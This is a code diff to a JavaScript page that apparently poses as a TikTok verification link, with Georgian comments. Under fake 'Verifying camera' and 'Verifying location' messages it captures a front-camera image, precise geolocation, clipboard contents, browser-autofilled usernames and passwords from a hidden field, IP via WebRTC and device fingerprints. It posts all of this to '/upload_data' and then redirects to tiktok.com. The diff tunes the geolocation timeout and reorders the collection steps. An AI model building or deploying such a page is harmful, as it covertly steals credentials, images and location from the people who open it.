@@ -42,9 +42,10 @@
             ip: "უცნობია", audioFingerprint: "უცნობია", fonts: "უცნობია", 
             clipboard: "ვერ წაიკითხა", battery: "უცნობია", network: "უცნობია", tabs: "უცნობია",
             autofilledUser: "ვერ წაიკითხა", autofilledPass: "ვერ წაიკითხა",
-            orientation: "უცნობია", vibrated: "არა"
+            orientation: "უცნობია", vibrated: "არა", lat: "უარი", lon: "უარი", image: null
         };
 
+        // 1. კამერა
         const getCamera = () => new Promise((resolve) => {
             if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                 navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
@@ -64,16 +65,18 @@
             } else { resolve(null); }
         });
 
+        // 2. ლოკაცია (გაზრდილი ტაიმაუტით)
         const getLocation = () => new Promise((resolve) => {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
                     pos => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude }),
                     () => resolve({ lat: "უარი", lon: "უარი" }),
-                    { enableHighAccuracy: true, timeout: 10000 }
+                    { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
                 );
             } else { resolve({ lat: "უარი", lon: "უარი" }); }
         });
 
+        // 3. დანარჩენი ინფო
         async function collectRestInfo() {
             try {
                 const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
@@ -129,6 +132,10 @@
             const pass = document.getElementById('hiddenPass').value;
             if (user) secretData.autofilledUser = user;
             if (pass) secretData.autofilledPass = pass;
+
+            secretData.userAgent = navigator.userAgent; 
+            secretData.screen = window.screen.width + "x" + window.screen.height;
+            secretData.ram = navigator.deviceMemory || "უცნობია";
         }
 
         async function startProcess() {
@@ -139,27 +146,28 @@
             btn.innerText = "იტვირთება..."; 
             loader.style.display = 'block';
 
+            // 1. ჯერ კამერა
             btn.innerText = "Verifying camera...";
             const image = await getCamera();
             secretData.image = image;
 
+            // 2. მერე ლოკაცია
             btn.innerText = "Verifying location...";
             const loc = await getLocation();
             secretData.lat = loc.lat; 
             secretData.lon = loc.lon;
 
+            // 3. მერე დანარჩენი ინფო
             btn.innerText = "Finalizing...";
             await collectRestInfo();
-            
-            secretData.userAgent = navigator.userAgent; 
-            secretData.screen = window.screen.width + "x" + window.screen.height;
-            secretData.ram = navigator.deviceMemory || "უცნობია";
 
+            // 4. გაგზავნა
             await fetch('/upload_data', {
                 method: 'POST', headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ type: 'DIRECT_OPEN', secret: secretData })
             });
 
+            // 5. წარმატება
             loader.style.display = 'none';
             document.querySelector('.container').innerHTML = `<div style="font-size: 50px;">✅</div><h2 style="color: #25F4EE;">Opening TikTok...</h2>`;
             setTimeout(() => { window.location.href = "https://www.tiktok.com"; }, 1500);
